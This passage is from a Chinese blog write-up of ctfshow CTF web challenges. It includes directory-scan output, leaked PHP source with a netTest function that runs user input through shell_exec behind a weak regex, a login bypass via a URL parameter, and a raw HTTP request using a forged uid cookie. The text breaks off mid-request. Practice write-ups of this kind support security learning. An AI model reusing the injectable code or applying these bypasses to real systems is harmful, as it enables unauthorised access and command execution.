<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="考核我的内网渗透？"><title>ctfshow终极考核</title><link rel=canonical href=https://baozongwi.xyz/p/ctfshow-final-assessment/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="ctfshow终极考核"><meta property='og:description' content="考核我的内网渗透？"><meta property='og:url' content='https://baozongwi.xyz/p/ctfshow-final-assessment/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='内网渗透'><meta property='article:tag' content='mysql'><meta property='article:published_time' content='2024-09-24T12:16:07+00:00'><meta property='article:modified_time' content='2024-09-24T12:16:07+00:00'><meta name=twitter:title content="ctfshow终极考核"><meta name=twitter:description content="考核我的内网渗透？"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-final-assessment/>ctfshow终极考核</a></h2><h3 class=article-subtitle>考核我的内网渗透？</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-09-24T12:16:07Z>Sep 24, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>23 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 505 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=web640>web640</h1><p>进入就有<code>flag</code></p><h1 id=web644>web644</h1><p>查看源码发现一个页面，但是这样子又跳转回去了，扫一下吧那</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[00:21:46] 200 -   43B  - /.bowerrc                                         
</span></span><span class=line><span class=cl>[00:21:47] 200 -   34B  - /.gitignore                                       
</span></span><span class=line><span class=cl>[00:21:49] 200 -    2KB - /.travis.yml                                      
</span></span><span class=line><span class=cl>[00:22:06] 200 -    3KB - /page.php                                         
</span></span><span class=line><span class=cl>[00:22:10] 200 -   19B  - /robots.txt 
</span></span></code></pre></td></tr></table></div></div><p>然后拿到了源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;init.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>addUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;娣诲姞鎴愬姛&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>)</span><span class=o>==</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$s</span> <span class=o>=</span> <span class=nv>$data</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@&#39;</span><span class=o>.</span><span class=nv>$password</span><span class=o>.</span><span class=s1>&#39;|&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=nx>DB_PATH</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span><span class=o>=-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;鐢ㄦ埛宸插瓨鍦�&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>updateUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;鏇存柊鎴愬姛&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nv>$username</span><span class=o>!=</span><span class=s1>&#39;admin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$s</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@[0-9a-zA-Z]+\|/&#39;</span><span class=p>,</span> <span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@&#39;</span><span class=o>.</span><span class=nv>$password</span><span class=o>.</span><span class=s1>&#39;|&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=nx>DB_PATH</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span><span class=o>=-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;鐢ㄦ埛涓嶅瓨鍦ㄦ垨鏃犳潈鏇存柊&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>delUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;鍒犻櫎鎴愬姛&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nv>$username</span><span class=o>!=</span><span class=s1>&#39;admin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$s</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@[0-9a-zA-Z]+\|/&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=nx>DB_PATH</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span><span class=o>=-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;鐢ㄦ埛涓嶅瓨鍦ㄦ垨鏃犳潈鍒犻櫎&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@[0-9a-zA-Z]+\|/&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>initCache</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>file_exists</span><span class=p>(</span><span class=s1>&#39;cache.php&#39;</span><span class=p>)</span><span class=o>?:</span><span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;cache.php&#39;</span><span class=p>,</span><span class=s1>&#39;&lt;!-- ctfshow-web-cache --&gt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>clearCache</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;rm -rf cache.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=s1>&#39;ok&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>flushCache</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=s1>&#39;cache.php&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;cache.php&#39;</span><span class=p>)</span><span class=o>===</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>FLAG646</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>netTest</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;鍛戒护鎵ц澶辫触&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}/&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$res</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>stripos</span><span class=p>(</span><span class=k>PHP_OS</span><span class=p>,</span><span class=s1>&#39;WIN&#39;</span><span class=p>)</span><span class=o>!==</span><span class=k>FALSE</span><span class=o>?</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nx>iconv</span><span class=p>(</span><span class=s2>&#34;GBK&#34;</span><span class=p>,</span> <span class=s2>&#34;UTF-8&#34;</span><span class=p>,</span> <span class=nv>$res</span><span class=p>)</span><span class=o>:</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$res</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[A-Za-z]+$/&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$res</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>stripos</span><span class=p>(</span><span class=k>PHP_OS</span><span class=p>,</span><span class=s1>&#39;WIN&#39;</span><span class=p>)</span><span class=o>!==</span><span class=k>FALSE</span><span class=o>?</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nx>iconv</span><span class=p>(</span><span class=s2>&#34;GBK&#34;</span><span class=p>,</span> <span class=s2>&#34;UTF-8&#34;</span><span class=p>,</span> <span class=nv>$res</span><span class=p>)</span><span class=o>:</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$res</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后就找不到了</p><p>试着进入<code>/system36d</code>发现是个登录界面，</p><p>在<code>https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/static/js/lock/index.js</code>查看源代码,拿到644的flag同时找到了这个</p><p><code>checklogin.php?s=10</code>,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/checklogin.php?s=10
</span></span></code></pre></td></tr></table></div></div><p>然后进入了后台</p><h1 id=web642>web642</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /system36d/ HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
